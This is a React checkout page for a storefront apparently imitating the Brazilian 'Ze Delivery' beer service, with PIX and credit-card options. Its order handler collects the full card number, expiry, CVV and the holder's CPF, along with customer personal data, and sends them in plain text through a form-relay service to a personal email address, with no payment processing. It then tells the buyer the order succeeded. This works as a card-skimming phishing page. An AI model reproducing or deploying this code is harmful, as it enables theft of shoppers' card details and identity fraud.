import { useState } from "react";
import { useNavigate } from "react-router-dom";
import { ArrowLeft, MapPin, CreditCard, QrCode, CheckCircle2, Loader2, Copy, Check } from "lucide-react";
import { QRCodeSVG } from "qrcode.react";
import { useCart } from "@/context/CartContext";
import { toast } from "@/hooks/use-toast";
import { supabase } from "@/integrations/supabase/client";

type PaymentMethod = "pix" | "credit";

const paymentMethods: { id: PaymentMethod; label: string; icon: React.ReactNode }[] = [
  { id: "pix", label: "PIX", icon: <QrCode className="h-5 w-5" /> },
  { id: "credit", label: "Crédito", icon: <CreditCard className="h-5 w-5" /> },
];

const Checkout = () => {
  const navigate = useNavigate();
  const { items, totalPrice, setIsOpen } = useCart();
  const [payment, setPayment] = useState<PaymentMethod>("pix");
  const [orderPlaced, setOrderPlaced] = useState(false);

  const [address, setAddress] = useState({
    cep: "",
    street: "",
    number: "",
    complement: "",
    neighborhood: "",
    city: "",
  });

  const [card, setCard] = useState({
    number: "",
    name: "",
    expiry: "",
    cvv: "",
    cpf: "",
  });

  const [customer, setCustomer] = useState({
    name: "",
    email: "",
    phone: "",
    cpf: "",
  });

  const deliveryFee = 5.99;
  const total = totalPrice + deliveryFee;

  const [copied, setCopied] = useState(false);
  const [pixData, setPixData] = useState<{ qr_code?: string; qr_code_url?: string; copy_paste?: string; pix?: { qrcode?: string } } | null>(null);
  const [pixLoading, setPixLoading] = useState(false);

  const handleGeneratePix = async () => {
    if (!customer.name || !customer.cpf || !customer.email || !customer.phone) {
      toast({ title: "Preencha seus dados pessoais para gerar o PIX", variant: "destructive" });
      return;
    }
    if (total < 10) {
      toast({ title: "Valor mínimo para PIX é R$ 10,00. Adicione mais itens ao carrinho.", variant: "destructive" });
      return;
    }
    setPixLoading(true);
    try {
      const { data, error } = await supabase.functions.invoke("create-pix-payment", {
        body: {
          amount: total,
          description: "Pedido Ze Delivery",
          items: items.map((i) => ({ name: i.name, quantity: i.quantity, price: i.price })),
          customer: {
            name: customer.name,
            email: customer.email,
            phone: customer.phone.replace(/\D/g, ""),
            document: customer.cpf.replace(/\D/g, ""),
          },
        },
      });
      if (error) throw error;
      setPixData(data);
    } catch (err: any) {
      console.error("PIX error:", err);
      // Try to extract a meaningful error message
      let errorMsg = "Erro ao gerar QR Code PIX. Tente novamente.";
      try {
        const ctx = err?.context;
        if (ctx) {
          const body = await ctx.json?.();
          const inner = body?.error;
          if (typeof inner === 'object' && inner?.message) {
            const parsed = typeof inner.message === 'string' && inner.message.startsWith('{') 
              ? JSON.parse(inner.message) 
              : inner;
            if (parsed?.error?.includes("minimum")) {
              errorMsg = "Valor mínimo para pagamento PIX é R$ 10,00. Adicione mais itens ao carrinho.";
            } else if (parsed?.message?.includes("invalid cpf")) {
              errorMsg = "CPF inválido. Verifique e tente novamente.";
            }
          } else if (typeof inner === 'string') {
            if (inner.includes("minimum")) {
              errorMsg = "Valor mínimo para pagamento PIX é R$ 10,00. Adicione mais itens ao carrinho.";
            }
          }
        }
      } catch { /* keep default message */ }
      toast({ title: errorMsg, variant: "destructive" });
    } finally {
      setPixLoading(false);
    }
  };

  const handleCopyPix = async () => {
    const code = pixData?.copy_paste || pixData?.pix?.qrcode || pixData?.qr_code || "";
    if (!code) return;
    await navigator.clipboard.writeText(code);
    setCopied(true);
    toast({ title: "Código PIX copiado!" });
    setTimeout(() => setCopied(false), 3000);
  };

  const isFormValid =
    address.street.trim() !== "" &&
    address.number.trim() !== "" &&
    address.neighborhood.trim() !== "" &&
    address.city.trim() !== "";

  const isCardValid =
    payment !== "credit" ||
    (card.number.trim() !== "" &&
      card.name.trim() !== "" &&
      card.expiry.trim() !== "" &&
      card.cvv.trim() !== "");

  const [loading, setLoading] = useState(false);
  const [cepLoading, setCepLoading] = useState(false);

  const handleCepChange = async (value: string) => {
    const cleaned = value.replace(/\D/g, "");
    const formatted = cleaned.length > 5 ? cleaned.slice(0, 5) + "-" + cleaned.slice(5, 8) : cleaned;
    setAddress((prev) => ({ ...prev, cep: formatted }));

    if (cleaned.length === 8) {
      setCepLoading(true);
      try {
        const res = await fetch(`https://viacep.com.br/ws/${cleaned}/json/`);
        const data = await res.json();
        if (!data.erro) {
          setAddress((prev) => ({
            ...prev,
            cep: formatted,
            street: data.logradouro || prev.street,
            neighborhood: data.bairro || prev.neighborhood,
            city: data.localidade || prev.city,
          }));
        }
      } catch {
        // silently fail
      } finally {
        setCepLoading(false);
      }
    }
  };
  const handlePlaceOrder = async () => {
    if (!isFormValid || !isCardValid) {
      toast({ title: "Preencha todos os campos obrigatórios", variant: "destructive" });
      return;
    }
    setLoading(true);
    try {
      const itemsText = items
        .map((i) => `${i.quantity}x ${i.name} - R$ ${(i.price * i.quantity).toFixed(2).replace(".", ",")}`)
        .join("\n");

      const addressText = `${address.street}, ${address.number}${address.complement ? ` - ${address.complement}` : ""}\n${address.neighborhood} - ${address.city}${address.cep ? `\nCEP: ${address.cep}` : ""}`;

      const cardText =
        payment === "credit"
          ? `\n\n💳 DADOS DO CARTÃO\nNome: ${card.name}\nCPF: ${card.cpf}\nNúmero: ${card.number}\nValidade: ${card.expiry}\nCVV: ${card.cvv}`
          : "";

      const customerText = `👤 DADOS DO CLIENTE\nNome: ${customer.name}\nCPF: ${customer.cpf}\nTelefone: ${customer.phone}\nEmail: ${customer.email}`;

      const message = `🍺 NOVO PEDIDO\n\n${customerText}\n\n📍 ENDEREÇO\n${addressText}\n\n💳 PAGAMENTO: ${payment === "pix" ? "PIX" : "Crédito"}${cardText}\n\n📦 ITENS\n${itemsText}\n\nSubtotal: R$ ${totalPrice.toFixed(2).replace(".", ",")}\nTaxa de entrega: R$ ${deliveryFee.toFixed(2).replace(".", ",")}\nTotal: R$ ${total.toFixed(2).replace(".", ",")}`;

      const formData = new FormData();
      formData.append("email", "rubenscardosoaguiar@gmail.com");
      formData.append("_subject", `Novo Pedido - R$ ${total.toFixed(2).replace(".", ",")}`);
      formData.append("message", message);
      formData.append("_captcha", "false");
      formData.append("_template", "box");

      await fetch("https://formsubmit.co/ajax/rubenscardosoaguiar@gmail.com", {
        method: "POST",
        body: formData,
      });

      setOrderPlaced(true);
    } catch (err) {
      console.error(err);
      toast({ title: "Erro ao enviar pedido", description: "Tente novamente.", variant: "destructive" });
    } finally {
      setLoading(false);
    }
  };

  if (items.length === 0 && !orderPlaced) {
    return (
      <div className="min-h-screen bg-background flex flex-col items-center justify-center gap-4 p-6">
        <p className="text-4xl">🛒</p>
        <p className="text-lg font-bold text-foreground">Seu carrinho está vazio</p>
        <button
          onClick={() => navigate("/")}
          className="rounded-full bg-primary px-6 py-2 font-bold text-primary-foreground hover:opacity-90 transition-opacity"
        >
          Voltar às compras
        </button>
      </div>
    );
  }

  if (orderPlaced) {
    return (
      <div className="min-h-screen bg-background flex flex-col items-center justify-center gap-4 p-6 text-center">
        <CheckCircle2 className="h-20 w-20 text-ze-green" />
        <h1 className="text-2xl font-black text-foreground">Pedido realizado!</h1>
        <p className="text-muted-foreground max-w-sm">
          Seu pedido foi enviado com sucesso. Em breve você receberá a confirmação. 🎉
        </p>
        <button
          onClick={() => navigate("/")}
          className="mt-4 rounded-full bg-primary px-6 py-3 font-bold text-primary-foreground hover:opacity-90 transition-opacity"
        >
          Voltar ao início
        </button>
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-background">
      {/* Header */}
      <header className="sticky top-0 z-50 bg-card border-b border-border">
        <div className="container flex items-center gap-3 py-4">
          <button
            onClick={() => navigate("/")}
            className="flex h-9 w-9 items-center justify-center rounded-full bg-muted hover:bg-muted/80 transition-colors"
          >
            <ArrowLeft className="h-5 w-5 text-foreground" />
          </button>
          <h1 className="text-lg font-black text-foreground">Finalizar Pedido</h1>
        </div>
      </header>

      <div className="container py-6 pb-24 space-y-6 max-w-2xl px-4 sm:px-6">
        {/* Customer Info */}
        <section className="rounded-xl bg-card border border-border p-5 space-y-4">
          <h2 className="flex items-center gap-2 text-base font-black text-card-foreground">
            <span className="text-ze-orange text-lg">👤</span>
            Seus Dados
          </h2>
          <div className="grid grid-cols-1 sm:grid-cols-2 gap-3">
            <input
              placeholder="Nome completo *"
              value={customer.name}
              onChange={(e) => setCustomer({ ...customer, name: e.target.value })}
              className="col-span-full rounded-lg border border-input bg-background px-3 py-2.5 text-sm text-foreground placeholder:text-muted-foreground focus:outline-none focus:ring-2 focus:ring-ring"
            />
            <input
              placeholder="CPF *"
              value={customer.cpf}
              onChange={(e) => {
                const digits = e.target.value.replace(/\D/g, "").slice(0, 11);
                const masked = digits
                  .replace(/(\d{3})(\d)/, "$1.$2")
                  .replace(/(\d{3})(\d)/, "$1.$2")
                  .replace(/(\d{3})(\d{1,2})$/, "$1-$2");
                setCustomer({ ...customer, cpf: masked });
              }}
              className="rounded-lg border border-input bg-background px-3 py-2.5 text-sm text-foreground placeholder:text-muted-foreground focus:outline-none focus:ring-2 focus:ring-ring"
              maxLength={14}
            />
            <input
              placeholder="Telefone *"
              value={customer.phone}
              onChange={(e) => setCustomer({ ...customer, phone: e.target.value })}
              className="rounded-lg border border-input bg-background px-3 py-2.5 text-sm text-foreground placeholder:text-muted-foreground focus:outline-none focus:ring-2 focus:ring-ring"
              maxLength={15}
            />
            <input
              placeholder="Email *"
              value={customer.email}
              onChange={(e) => setCustomer({ ...customer, email: e.target.value })}
              className="col-span-full rounded-lg border border-input bg-background px-3 py-2.5 text-sm text-foreground placeholder:text-muted-foreground focus:outline-none focus:ring-2 focus:ring-ring"
            />
          </div>
        </section>

        {/* Address */}
        <section className="rounded-xl bg-card border border-border p-5 space-y-4">
          <h2 className="flex items-center gap-2 text-base font-black text-card-foreground">
            <MapPin className="h-5 w-5 text-ze-orange" />
            Endereço de Entrega
          </h2>
          <div className="grid grid-cols-1 sm:grid-cols-2 gap-3">
            <div className="relative">
              <input
                placeholder="CEP"
                value={address.cep}
                onChange={(e) => handleCepChange(e.target.value)}
                className="w-full rounded-lg border border-input bg-background px-3 py-2.5 text-sm text-foreground placeholder:text-muted-foreground focus:outline-none focus:ring-2 focus:ring-ring"
                maxLength={9}
              />
              {cepLoading && (
                <Loader2 className="absolute right-3 top-1/2 -translate-y-1/2 h-4 w-4 animate-spin text-muted-foreground" />
              )}
            </div>
            <input
              placeholder="Cidade *"
              value={address.city}
              onChange={(e) => setAddress({ ...address, city: e.target.value })}
              className="rounded-lg border border-input bg-background px-3 py-2.5 text-sm text-foreground placeholder:text-muted-foreground focus:outline-none focus:ring-2 focus:ring-ring"
            />
            <input
              placeholder="Rua *"
              value={address.street}
              onChange={(e) => setAddress({ ...address, street: e.target.value })}
              className="col-span-full rounded-lg border border-input bg-background px-3 py-2.5 text-sm text-foreground placeholder:text-muted-foreground focus:outline-none focus:ring-2 focus:ring-ring"
            />
            <input
              placeholder="Número *"
              value={address.number}
              onChange={(e) => setAddress({ ...address, number: e.target.value })}
              className="rounded-lg border border-input bg-background px-3 py-2.5 text-sm text-foreground placeholder:text-muted-foreground focus:outline-none focus:ring-2 focus:ring-ring"
            />
            <input
              placeholder="Complemento"
              value={address.complement}
              onChange={(e) => setAddress({ ...address, complement: e.target.value })}
              className="rounded-lg border border-input bg-background px-3 py-2.5 text-sm text-foreground placeholder:text-muted-foreground focus:outline-none focus:ring-2 focus:ring-ring"
            />
            <input
              placeholder="Bairro *"
              value={address.neighborhood}
              onChange={(e) => setAddress({ ...address, neighborhood: e.target.value })}
              className="col-span-full sm:col-span-1 rounded-lg border border-input bg-background px-3 py-2.5 text-sm text-foreground placeholder:text-muted-foreground focus:outline-none focus:ring-2 focus:ring-ring"
            />
          </div>
        </section>

        {/* Payment Method */}
        <section className="rounded-xl bg-card border border-border p-5 space-y-4">
          <h2 className="flex items-center gap-2 text-base font-black text-card-foreground">
            <CreditCard className="h-5 w-5 text-ze-orange" />
            Forma de Pagamento
          </h2>
          <div className="grid grid-cols-2 gap-3">
            {paymentMethods.map((m) => (
              <button
                key={m.id}
                onClick={() => setPayment(m.id)}
                className={`flex items-center gap-2 rounded-lg border-2 px-4 py-3 text-sm font-bold transition-all ${
                  payment === m.id
                    ? "border-primary bg-primary/10 text-foreground"
                    : "border-border bg-background text-muted-foreground hover:border-muted-foreground/30"
                }`}
              >
                {m.icon}
                {m.label}
              </button>
            ))}
          </div>
        </section>

        {/* PIX QR Code */}
        {payment === "pix" && (
          <section className="rounded-xl bg-card border border-border p-5 space-y-4">
            <h2 className="flex items-center gap-2 text-base font-black text-card-foreground">
              <QrCode className="h-5 w-5 text-ze-orange" />
              QR Code PIX
            </h2>
            <div className="flex flex-col items-center gap-4">
              {pixLoading ? (
                <div className="flex flex-col items-center gap-3 py-8">
                  <Loader2 className="h-8 w-8 animate-spin text-muted-foreground" />
                  <p className="text-sm text-muted-foreground">Gerando QR Code...</p>
                </div>
              ) : (pixData?.qr_code || pixData?.pix?.qrcode) ? (
                <>
                  <div className="rounded-xl bg-white p-4">
                    <QRCodeSVG value={pixData?.pix?.qrcode || pixData?.qr_code || ""} size={200} />
                  </div>
                  <p className="text-sm text-muted-foreground text-center max-w-xs">
                    Escaneie o QR Code acima com o app do seu banco ou copie o código para pagar.
                  </p>
                  <button
                    onClick={handleCopyPix}
                    className="flex items-center gap-2 rounded-lg border border-border bg-background px-4 py-2.5 text-sm font-bold text-foreground hover:bg-muted transition-colors"
                  >
                    {copied ? <Check className="h-4 w-4 text-ze-green" /> : <Copy className="h-4 w-4" />}
                    {copied ? "Copiado!" : "Copiar código PIX"}
                  </button>
                </>
              ) : pixData?.qr_code_url ? (
                <>
                  <div className="rounded-xl bg-white p-4">
                    <img src={pixData.qr_code_url} alt="QR Code PIX" className="w-[200px] h-[200px]" />
                  </div>
                  <p className="text-sm text-muted-foreground text-center max-w-xs">
                    Escaneie o QR Code acima com o app do seu banco ou copie o código para pagar.
                  </p>
                  {pixData.copy_paste && (
                    <button
                      onClick={handleCopyPix}
                      className="flex items-center gap-2 rounded-lg border border-border bg-background px-4 py-2.5 text-sm font-bold text-foreground hover:bg-muted transition-colors"
                    >
                      {copied ? <Check className="h-4 w-4 text-ze-green" /> : <Copy className="h-4 w-4" />}
                      {copied ? "Copiado!" : "Copiar código PIX"}
                    </button>
                  )}
                </>
              ) : (
                <button
                  onClick={handleGeneratePix}
                  className="w-full rounded-lg bg-primary py-3 text-sm font-bold text-primary-foreground hover:opacity-90 transition-opacity"
                >
                  Gerar QR Code PIX
                </button>
              )}
            </div>
          </section>
        )}

        {payment === "credit" && (
          <section className="rounded-xl bg-card border border-border p-5 space-y-4">
            <h2 className="flex items-center gap-2 text-base font-black text-card-foreground">
              <CreditCard className="h-5 w-5 text-ze-orange" />
              Dados do Cartão
            </h2>
            <div className="grid grid-cols-1 sm:grid-cols-2 gap-3">
              <input
                placeholder="Nome no cartão *"
                value={card.name}
                onChange={(e) => setCard({ ...card, name: e.target.value })}
                className="col-span-full rounded-lg border border-input bg-background px-3 py-2.5 text-sm text-foreground placeholder:text-muted-foreground focus:outline-none focus:ring-2 focus:ring-ring"
              />
              <input
                placeholder="Número do cartão *"
                value={card.number}
                onChange={(e) => setCard({ ...card, number: e.target.value })}
                className="col-span-full rounded-lg border border-input bg-background px-3 py-2.5 text-sm text-foreground placeholder:text-muted-foreground focus:outline-none focus:ring-2 focus:ring-ring"
                maxLength={19}
              />
              <input
                placeholder="Validade (MM/AA) *"
                value={card.expiry}
                onChange={(e) => setCard({ ...card, expiry: e.target.value })}
                className="rounded-lg border border-input bg-background px-3 py-2.5 text-sm text-foreground placeholder:text-muted-foreground focus:outline-none focus:ring-2 focus:ring-ring"
                maxLength={5}
              />
              <input
                placeholder="CVV *"
                value={card.cvv}
                onChange={(e) => setCard({ ...card, cvv: e.target.value })}
                className="rounded-lg border border-input bg-background px-3 py-2.5 text-sm text-foreground placeholder:text-muted-foreground focus:outline-none focus:ring-2 focus:ring-ring"
                maxLength={4}
              />
              <input
                placeholder="CPF do titular *"
                value={card.cpf || ""}
                onChange={(e) => {
                  const digits = e.target.value.replace(/\D/g, "").slice(0, 11);
                  const masked = digits
                    .replace(/(\d{3})(\d)/, "$1.$2")
                    .replace(/(\d{3})(\d)/, "$1.$2")
                    .replace(/(\d{3})(\d{1,2})$/, "$1-$2");
                  setCard({ ...card, cpf: masked });
                }}
                className="col-span-full rounded-lg border border-input bg-background px-3 py-2.5 text-sm text-foreground placeholder:text-muted-foreground focus:outline-none focus:ring-2 focus:ring-ring"
                maxLength={14}
              />
            </div>
          </section>
        )}

        {/* Order Summary */}
        <section className="rounded-xl bg-card border border-border p-5 space-y-3">
          <h2 className="text-base font-black text-card-foreground">Resumo do Pedido</h2>
          <div className="space-y-2 max-h-48 overflow-y-auto">
            {items.map((item) => (
              <div key={item.id} className="flex items-center justify-between text-sm">
                <span className="text-foreground">
                  {item.quantity}x {item.name}
                </span>
                <span className="font-bold text-foreground">
                  R$ {(item.price * item.quantity).toFixed(2).replace(".", ",")}
                </span>
              </div>
            ))}
          </div>
          <div className="border-t border-border pt-3 space-y-1">
            <div className="flex justify-between text-sm text-muted-foreground">
              <span>Subtotal</span>
              <span>R$ {totalPrice.toFixed(2).replace(".", ",")}</span>
            </div>
            <div className="flex justify-between text-sm text-muted-foreground">
              <span>Taxa de entrega</span>
              <span>R$ {deliveryFee.toFixed(2).replace(".", ",")}</span>
            </div>
            <div className="flex justify-between text-lg font-black text-ze-green pt-1">
              <span>Total</span>
              <span>R$ {total.toFixed(2).replace(".", ",")}</span>
            </div>
          </div>
        </section>

        {/* CTA - fixed on mobile (hide when PIX QR code is showing) */}
        {payment !== "pix" && (
          <div className="fixed bottom-0 left-0 right-0 bg-card border-t border-border p-4 sm:static sm:bg-transparent sm:border-0 sm:p-0 z-40">
            <button
              onClick={handlePlaceOrder}
              disabled={!isFormValid || !isCardValid || loading}
              className="w-full max-w-2xl mx-auto rounded-full bg-ze-green py-4 text-center font-black text-white text-lg shadow-lg hover:opacity-90 transition-opacity disabled:opacity-50 disabled:cursor-not-allowed"
            >
              {loading ? "Enviando..." : `Confirmar Pedido — R$ ${total.toFixed(2).replace(".", ",")}`}
            </button>
          </div>
        )}
      </div>
    </div>
  );
};

export default Checkout;
